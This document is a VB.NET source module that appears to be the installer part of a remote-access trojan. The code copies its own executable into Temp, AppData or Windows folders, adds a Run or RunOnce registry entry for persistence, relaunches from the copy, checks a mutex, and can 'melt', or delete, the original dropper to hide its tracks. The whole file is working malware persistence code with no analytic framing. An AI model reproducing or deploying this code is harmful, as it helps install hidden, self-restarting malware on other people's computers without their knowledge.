Imports System.Text.RegularExpressions
Imports System.Runtime.InteropServices
Imports Microsoft.Win32
Imports System.Threading
Imports System.IO


#Region "Install Locations"
Public Class StartupLocation
    Public Shared ReadOnly Temp As String = System.Environment.GetEnvironmentVariable("temp")
    Public Shared ReadOnly AppData As String = System.Environment.GetEnvironmentVariable("appdata")
    Public Shared ReadOnly Windir As String = System.Environment.GetEnvironmentVariable("windir")
End Class
#End Region

#Region "Install Server"
Public Class Installer

    Private Shared CustomDir As String = Nothing


    Private Shared Function InstallDirectory(ByVal InstallLocation As String, Optional ByVal Subfoldername As String = "") As String
        If Subfoldername.Contains("\") Then
            Regex.Replace(Subfoldername, "\", String.Empty)
        End If
        If Subfoldername = String.Empty Then
            CustomDir = "\"
        Else
            CustomDir = "\" & Subfoldername & "\"
            Win32.CreateDirectory(InstallLocation & CustomDir, Nothing)
        End If
        Return CustomDir
    End Function

    Private Shared Function CopyFileToTarget(ByVal InstallLocation As String, Optional ByVal SubDirectory As String = "", Optional ByVal FileName As String = "") As Boolean
        Try
            Win32.CopyFile(Application.ExecutablePath, InstallLocation & InstallDirectory(InstallLocation, SubDirectory) & FileName, False)
            Return True
        Catch
            Return False
        End Try
    End Function

    Private Shared Function WriteRegistryKeys(ByVal FilePath As String, ByVal HKCUorHKLM As Boolean, ByVal RunorRunOnce As Boolean, ByVal KeyName As String) As Boolean
        Dim regKey As RegistryKey
        Dim Startupkey As String = "Software\Microsoft\Windows\CurrentVersion\Run"
        If Not RunorRunOnce Then Startupkey &= "Once"
        If HKCUorHKLM Then
            regKey = Registry.CurrentUser.OpenSubKey(Startupkey, True)
        Else
            regKey = Registry.LocalMachine.OpenSubKey(Startupkey, True)
        End If
        regKey.SetValue(KeyName, FilePath)
        regKey.Close()
        Return True
    End Function

    Public Shared Function MutexCheck(ByVal MutexString As String) As Boolean
        Try
            Dim Mutex1 As Mutex
            Mutex1 = New Mutex(False, MutexString)
            If Mutex1.WaitOne(0, False) = False Then
                Mutex1.Close()
                Return True
            Else
                Return False
            End If
        Catch
            Return False
        End Try
    End Function

    Private Shared Sub ChangeRunning(ByVal NewPath As String)
        Process.Start(NewPath)
        End
    End Sub


    ' Install server into specified directory, set startup location, specify subdir, specify droped filename
    Public Shared Sub Install(ByVal InstallLocation As String, ByVal KeyName As String, ByVal HKCUorHKLM As Boolean, ByVal RunorRunOnce As Boolean, Optional ByVal SubDirectory As String = "", Optional ByVal FileName As String = Nothing)
        Dim InstallationPath As String = InstallLocation & InstallDirectory(InstallLocation, SubDirectory) & FileName
        If RunorRunOnce = False Then
            WriteRegistryKeys(InstallationPath, HKCUorHKLM, RunorRunOnce, KeyName)
        End If
        If Application.ExecutablePath.Contains(InstallationPath) Then
            ModuleMain.DebugToConsole("Server already installed.", DebugStatus.Success)
            If Settings.StubMelt = True Then
                Try
                    If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\zrmelt.dat") Then
                        Try
                            File.Delete(File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\zrmelt.dat"))
                            File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\zrmelt.dat")
                        Catch
                        End Try
                   
                    End If
                Catch
                End Try
            End If
            Exit Sub          
        Else
            If Settings.StubMelt = True Then
                File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\zrmelt.dat", Application.ExecutablePath)
            End If
            ModuleMain.DebugToConsole("Copying server to target directory...", DebugStatus.Pending)
        End If

        If FileName = Nothing Then
            FileName = IO.Path.GetFileName(Application.ExecutablePath)
        End If
        CopyFileToTarget(InstallLocation, SubDirectory, FileName)
        ModuleMain.DebugToConsole("Set Registrykeys...", DebugStatus.Pending)
        WriteRegistryKeys(InstallationPath, HKCUorHKLM, RunorRunOnce, KeyName)
        ModuleMain.DebugToConsole("Starting server from Install Directory...", DebugStatus.Pending)
        ChangeRunning(InstallationPath)
    End Sub

End Class

#End Region